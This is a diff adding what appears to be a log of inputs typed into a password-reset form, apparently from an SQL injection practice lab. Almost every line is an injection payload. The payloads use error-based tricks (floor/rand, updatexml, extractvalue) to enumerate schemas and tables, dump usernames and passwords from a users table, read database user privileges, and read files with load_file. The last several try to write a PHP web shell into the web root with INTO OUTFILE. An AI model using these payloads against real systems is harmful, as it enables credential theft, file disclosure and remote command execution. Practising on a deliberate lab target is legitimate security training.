@@ -1,0 +1,102 @@
+User Name:123
+New Password:
+User Name:'123\"'
+New Password:
+User Name:'123\"\''
+New Password:
+User Name:''
+New Password:
+User Name:2147483647
+New Password:
+User Name:'aaaaaaaaaaaaaaa'
+New Password:
+User Name:1
+New Password:
+User Name:12
+New Password:', (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y))#
+User Name:'\', (SELECT 1 FR'
+New Password:', (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y))#
+User Name:'Dumb'
+New Password:', (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y))#
+User Name:'Dumb'
+New Password:', (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y))#
+User Name:'Dumb'
+New Password:'\, (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y))#
+User Name:1
+New Password:' or updatexml(1,concat(0x5e5e,version(),0x5e5e),1)-- 
+User Name:'Dumb'
+New Password:' or updatexml(1,concat(0x5e5e,version(),0x5e5e),1)-- 
+User Name:'\' or updatexml('
+New Password:1
+User Name:'\' or updatexml('
+New Password:' or updatexml(1,concat(0x5e5e,version(),0x5e5e),1)-- 
+User Name:'Dumb'
+New Password:' or updatexml(1,concat(0x5e5e,version(),0x5e5e),1)-- 
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y))#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y))#
+User Name:'Dumb'
+New Password:', (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat((select schema_name from information_schema.schemata limit 0,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat(database(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat((SELECT table_name from information_schema.tables where table_schema = 'security' LIMIT 1,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat((SELECT table_name from information_schema.tables where table_schema = 'security' LIMIT 2,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat((SELECT table_name from information_schema.tables where table_schema = 'security' LIMIT 4,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat((SELECT table_name from information_schema.tables where table_schema = 'security' LIMIT 3,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat((SELECT group_concat(id,username,password) from users LIMIT 3,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat((SELECT group_concat(id,username,password) from users LIMIT 0,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat((SELECT concat_ws(':', id, username, password) FROM users LIMIT 0,1), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:' and extractvalue(1,concat(0x7e,(select user())))-- 
+User Name:'Dumb'
+New Password:' and extractvalue(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e) from mysql.user)))-- 
+User Name:'Dumb'
+New Password:' union load_file('C:\\\\Windows\\\\win.ini')-- 
+User Name:'Dumb'
+New Password:' union select load_file('C:\\\\Windows\\\\win.ini')-- 
+User Name:'Dumb'
+New Password:' union select 1,load_file('C:\\\\Windows\\\\win.ini')-- 
+User Name:'Dumb'
+New Password:' union select 1,load_file('C:\\\\Windows\\\\win.ini')-- 
+User Name:'\' union select '
+New Password:
+User Name:'Dumb'
+New Password:' union select 1,load_file('C:\\\\Windows\\\\win.ini')-- 
+User Name:'Dumb'
+New Password:' union select 1,load_file('C:\\\\Windows\\\\win.ini')"-- 
+User Name:'Dumb'
+New Password:' union select 1,load_file('C:\\\\Windows\\\\win.ini')"-- 
+User Name:'Dumb'
+New Password:1' union select 1,load_file('C:\\\\Windows\\\\win.ini')-- 
+User Name:'Dumb'
+New Password:' or (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)#
+User Name:'Dumb'
+New Password:1' union (select 1,load_file('C:\\\\Windows\\\\win.ini'))-- 
+User Name:'Dumb'
+New Password:1' or 1=1 union select 1,load_file('C:\\\\Windows\\\\win.ini')-- 
+User Name:'Dumb'
+New Password:' and extractvalue(1,concat(0x7e,(select load_file('C:\\\\Windows\\\\win.ini'))))-- 
+User Name:'Dumb'
+New Password:' union select 1,"<?php system($_GET['cmd']) ?>" into outfile 'C:\wamp64\www\shell.php'--  
+User Name:'Dumb'
+New Password:' union select 1,'<?php system($_GET['cmd']) ?>' into outfile 'C:\wamp64\www\shell.php'-- 
+User Name:'Dumb'
+New Password:' union select '<?php system($_GET['cmd']) ?>' into outfile 'C:\wamp64\www\shell.php'-- 
+User Name:'Dumb'
+New Password:' union (select '<?php system($_GET['cmd']) ?>' into outfile 'C:\wamp64\www\shell.php')-- 
+User Name:'Dumb'
+New Password:' and extractvalue(1,concat(0x7e,(select '<?php system($_GET['cmd']) ?>' into outfile 'C:\wamp64\www\shell.php')))-- 
+User Name:'Dumb'
+New Password:' and extractvalue(1,concat(0x7e,(select "<?php system($_GET['cmd']) ?>" into outfile 'C:\wamp64\www\shell.php')))-- 
